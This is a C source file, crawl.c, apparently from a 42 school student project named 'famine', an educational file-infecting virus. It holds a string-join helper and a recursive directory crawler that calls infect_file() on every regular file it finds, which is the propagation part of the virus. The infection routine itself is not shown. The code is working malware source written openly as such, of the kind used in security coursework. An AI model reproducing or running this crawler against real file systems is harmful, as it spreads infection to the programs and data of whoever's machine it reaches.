/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   crawl.c                                            :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: mbatty <mbatty@student.42angouleme.fr>     +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2026/04/13 17:53:33 by mbatty            #+#    #+#             */
/*   Updated: 2026/04/15 16:07:19 by mbatty           ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include "famine.h"

#include <fcntl.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <dirent.h>

#define DIRENT_DIRECTORY 4

char	*strjoin(char const *s1, char const *s2)
{
	char	*dest;
	size_t	len;

	if (!s1 || !s2)
		return (0);
	len = (strlen(s1) + strlen(s2) + 1);
	dest = malloc(len * sizeof(char));
	if (dest == NULL)
		return (NULL);
	strncpy(dest, s1, len);
	strncat(dest, s2, len);
	return ((char *)dest);
}

/*
	Crawls the directory given by path
	If it finds a directory, it calls crawl_dir() recursively to explore it
	If it finds a file, it will try to infect it by calling infect_file()

	@param path path to targeted directory
	@param ctx context used mainly for argv/envp
*/
int	crawl_dir(const char *path, t_ctx *ctx)
{
	struct dirent	*dirent = NULL;
	DIR				*dir = opendir(path);
	if (!dir)
		return (-1);

	do
	{
		dirent = readdir(dir);
		if (dirent)
		{
			if (!strcmp(dirent->d_name, ".") || !strcmp(dirent->d_name, ".."))
				continue ;

			char	*path_next = strjoin(path, "/");
			if (path_next == NULL)
				goto _fn_error;

			char	*new_path = strjoin(path_next, dirent->d_name);
			free(path_next);
			if (new_path == NULL)
				goto _fn_error;

			if (dirent->d_type == DIRENT_DIRECTORY)
			{
				if (crawl_dir(new_path, ctx) == -1)
					goto _loop_error;
			}
			else
			{
				if (infect_file(ctx, new_path) == -1)
					goto _loop_error;
			}

			free(new_path);
			goto _loop_end;

			_loop_error:
			free(new_path);
			goto _fn_error;
		}
		_loop_end:;
	} while (dirent);
	closedir(dir);
	return (0);

	_fn_error:
	closedir(dir);
	return (-1);
}
